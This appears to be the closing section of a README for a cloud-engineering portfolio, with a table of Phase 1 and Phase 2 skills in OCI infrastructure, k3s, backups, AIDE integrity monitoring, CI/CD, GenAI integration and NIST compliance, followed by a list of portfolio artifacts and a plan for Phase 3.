| **Application Development** | FastAPI REST fundamentals | Webhooks, HMAC validation, event-driven patterns |
| **Container Orchestration** | Podman/Docker on single VM | k3s Kubernetes cluster, kubectl, Deployments, Services |
| **Backup and Disaster Recovery** | Block volume snapshot (manual) | Immutable backups, versioning, retention locks, measured RTO/RPO |
| **Security Monitoring** | Bash health check | AIDE file integrity (NIST SI-7), ransomware simulation, change detection |
| **CI/CD** | Jenkins pipeline | CloudBees CI, RBAC, Configuration as Code, audit trail (NIST AU-2/AU-3) |
| **AI Integration** | Ollama local LLM (no GPU) | OCI GenAI cloud inference, prompt engineering, security classification |
| **Cloud Operations** | Manual teardown verification | logrotate, cost modeling, disciplined IaC teardown workflow |
| **Compliance Alignment** | FedRAMP concepts introduced | NIST SI-7, AU-2, AU-3, IR-4 controls implemented and evidenced |

**Portfolio artifacts:**

- Terraform configurations: multi-node OCI infrastructure (`terraform/`)
- Ansible playbooks: hardening + FedAnalytics deployment + AIDE setup (`ansible/`)
- FedAnalytics FastAPI application with webhook and ADB integration (`app/`)
- OCI Generative AI incident classifier script (`ai/incident_classifier.py`)
- Combined AIDE + GenAI security report automation script (`ai/security_report.sh`)
- CloudBees CI Configuration as Code YAML (`jenkins/casc/jenkins.yaml`)
- Jenkins vs CloudBees comparison documentation (`docs/jenkins-vs-cloudbees-comparison.md`)
- Backup validation Jenkins pipeline (Groovy)
- Phase 2 cost model with Always Free documentation and paid-equivalent projections (`scripts/cost_model.py`)
- DR drill AIDE output with AI classification (`security_reports/dr-drill-ai-classification.txt`)
- Screenshots: k3s cluster, AIDE report, DR recovery, CloudBees CI, GenAI classifier output

**Next:** Phase 3 — FedCompliance: OCI API Gateway, classical ML log anomaly detection (scikit-learn), FedRAMP audit automation, and advanced Jenkins Pipeline Templates.

---
